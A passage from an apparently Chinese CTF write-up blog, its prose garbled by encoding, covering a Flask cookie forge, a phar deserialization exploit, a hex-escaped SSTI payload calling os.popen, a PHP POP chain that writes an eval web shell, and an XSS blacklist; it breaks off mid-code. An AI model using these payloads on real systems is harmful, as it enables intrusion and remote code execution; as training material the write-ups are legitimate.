<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python flask_session_cookie_manager2.py encode -s 12.498945071696037 -t &#34;{&#39;username&#39;:b&#39;fuck&#39;}&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gxyctf2019babysqliv30">[GXYCTF2019]BabysqliV3.0
</h2><p>Âº±Âè£‰ª§admin/password</p>
<p>ËøõÂéª‰º™ÂçèËÆÆËØªÊ∫êÁ†Å</p>
<p>upload.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Uploader</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$Filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$sandbox</span> <span class="o">=</span> <span class="nx">getcwd</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34;/uploads/&#34;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&#34;.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="k">and</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">=</span> <span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="nf">upload</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$sandbox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;[^a-z0-9]&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;illegal filename!&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;you are too big (‚Ä≤‚ñΩ`„ÄÉ)&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;move_uploaded_file(&#39;&#34;</span><span class="o">.</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&#39;, &#39;&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">.</span> <span class="s2">&#34;&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$sandbox</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">global</span> <span class="nv">$ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// return $sandbox.$this-&gt;Filename.$ext;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">!=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;check token falied!&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$uploader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uploader</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$uploader</span><span class="o">-&gt;</span><span class="na">upload</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$uploader</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="s2">&#34;‰∏ãÈù¢ÊòØ‰Ω†‰∏ä‰º†ÁöÑÊñá‰ª∂Ôºö&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$uploader</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$uploader</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>pharÂèçÂ∫èÂàóÂåñ</p>
<p>ÈùûÈ¢ÑÊúüÔºåfilenameÂèØÊéßÔºåÁõ¥Êé•‰º†ÂèÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">file</span><span class="o">=</span><span class="n">upload</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞flag</p>
<p>ÂéüÊù•ËøòÊúâ‰∏Ä‰∏™Áõ¥Êé•‰∏ä‰º†‰∏ÄÂè•ËØùÊú®È©¨ÁöÑÈùûÈ¢ÑÊúü‰º∞ËÆ°Áªô‰øÆ‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">!=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;die(&#39;check token falied!&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>tokenÂèØ‰ª•ÈÄöËøáÈöè‰æø‰∏ä‰º†Êñá‰ª∂Êù•Ëé∑Âèñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Uploader</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uploader</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="s2">&#34;highlight_file(&#39;/var/www/html/flag.php&#39;);&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">Filename</span> <span class="o">=</span> <span class="s1">&#39;test&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$upload</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">=</span> <span class="s1">&#39;GXY063c630ae7ab41c6fd121cb4851620a3&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;exp.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span><span class="o">.</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$upload</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;exp.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pasecactf_2019flask_ssti">[pasecactf_2019]flask_ssti
</h2><p>ÁÆÄÂçïÁöÑssti</p>
<p>ËøáÊª§‰∏ãÂàíÁ∫øÂíåÂçïÂºïÂè∑Ôºå16ËøõÂà∂ÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{config[&#34;\x5f\x5fclass\x5f\x5f&#34;][&#34;\x5f\x5finit\x5f\x5f&#34;][&#34;\x5f\x5fglobals\x5f\x5f&#34;][&#34;os&#34;][&#34;popen&#34;](&#34;whoami&#34;)[&#34;read&#34;]()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>flag‰∏çÂú®ÁõÆÂΩï</p>
<p>ËØªconfigÁúãÂà∞Âä†ÂØÜÂêéÁöÑ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def encode(line, key, key2):
</span></span><span class="line"><span class="cl">    return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app.config[&#39;flag&#39;] = encode(&#39;&#39;, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áî±‰∫éÊòØÂºÇÊàñÂÜçËøêË°å‰∏ÄÈÅçÂ∞±Ë°å‰∫Ü</p>
<p>ÊàñËÄÖËØªproc/self/fd/3</p>
<p>Âõ†‰∏∫fdÁõÆÂΩïÂèØ‰ª•ËØªÂà∞Ë¢´Âà†ÁöÑÁöÑÊñá‰ª∂ÂÜÖÂÆπ</p>
<p>‰ΩÜÊòØ‰∏äÈù¢Áõ¥Êé•ËØªÊòØÊ≤°ÊúâÁöÑ</p>
<p>Âõ†‰∏∫selfÊåáÂêëÂâçÈù¢ÁöÑpopenÔºåpopenË∑üflagÊìç‰ΩúÊó†ÂÖ≥</p>
<p>Êàë‰ª¨ÂÖàËØªpsËøõÁ®ãÔºåËØªÂà∞pid‰∏∫1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /proc/1/fd/3
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="eis-2019ezpop">[EIS 2019]EzPOP
</h2><p>ÊûÑÈÄ†popÈìæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$store</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$expire</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$store</span><span class="p">,</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$expire</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span><span class="o">=</span><span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expire</span><span class="o">=</span><span class="nv">$expire</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">store</span><span class="o">=</span><span class="nv">$store</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">B</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;serialize&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;base64_decode&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;data_compress&#39;</span><span class="p">]</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;prefix&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=uploads/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">autosave</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">complete</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]); ?&gt;&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gwctf-2019mypassword">[GWCTF 2019]mypassword
</h2><p>Ê≥®ÂÜåÁôªÂÖ•ÂêéÊü•Áúãfeedback.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$feedback</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">				<span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;ÂèçÈ¶à‰∏çÂêàÊ≥ï&#39;);&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span><span class="s1">&#39;#&#39;</span><span class="p">,</span><span class="s1">&#39;%&#39;</span><span class="p">,</span><span class="s1">&#39;input&#39;</span><span class="p">,</span><span class="s1">&#39;script&#39;</span><span class="p">,</span><span class="s1">&#39;iframe&#39;</span><span class="p">,</span><span class="s1">&#39;host&#39;</span><span class="p">,</span><span class="s1">&#39;onload&#39;</span><span class="p">,</span><span class="s1">&#39;onerror&#39;</span><span class="p">,</span><span class="s1">&#39;srcdoc&#39;</span><span class="p">,</span><span class="s1">&#39;location&#39;</span><span class="p">,</span><span class="s1">&#39;svg&#39;</span><span class="p">,</span><span class="s1">&#39;form&#39;</span><span class="p">,</span><span class="s1">&#39;img&#39;</span><span class="p">,</span><span class="s1">&#39;src&#39;</span><span class="p">,</span><span class="s1">&#39;getElement&#39;</span><span class="p">,</span><span class="s1">&#39;document&#39;</span><span class="p">,</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">			<span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		        <span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		            <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$feedback</span><span class="p">,</span><span class="nv">$val</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		                <span class="nv">$feedback</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$feedback</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		            <span class="p">}</span>
</span></span><span class="line"><span class="cl">		        <span class="p">}</span>
</span></span><span class="line"><span class="cl">		    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÈªëÂêçÂçï‰∏ÄÁúãÂ∞±ÊòØxss</p>
<p>Áî±‰∫éÂâçÈù¢login.js</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
